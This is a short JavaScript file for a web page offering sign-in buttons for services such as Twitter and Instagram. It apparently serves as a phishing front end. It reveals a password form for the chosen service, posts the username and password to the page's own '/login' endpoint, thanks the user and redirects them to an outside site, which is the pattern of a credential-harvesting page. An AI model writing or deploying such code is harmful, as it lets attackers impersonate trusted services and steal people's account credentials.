const btns      = document.querySelectorAll('.signin-btn');
const form      = document.getElementById('login-form');
const svcSelect = document.getElementById('service');
const userIn    = document.getElementById('user');
const passIn    = document.getElementById('pass');
const loginBtn  = document.getElementById('btnLogin');

// show dynamic login form
btns.forEach(btn => {
  btn.addEventListener('click', () => {
    const svc = btn.dataset.service;
    svcSelect.value = svc;
    userIn.placeholder = (svc === 'twitter' || svc === 'instagram')
                         ? 'Username'
                         : 'Email';
    form.style.display = 'block';
    window.scrollTo(0, document.body.scrollHeight);
  });
});

// submit credentials
loginBtn.addEventListener('click', () => {
  const payload = {
    service: svcSelect.value,
    user:    userIn.value,
    pass:    passIn.value
  };
  fetch('/login', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(payload)
  })
    .then(r => {
      if (r.status === 204) {
        alert('Thank you for signing in!');
        window.location.href = 'https://www.example.com';
      } else {
        throw new Error();
      }
    })
    .catch(() => alert('Error, please try again.'));
});
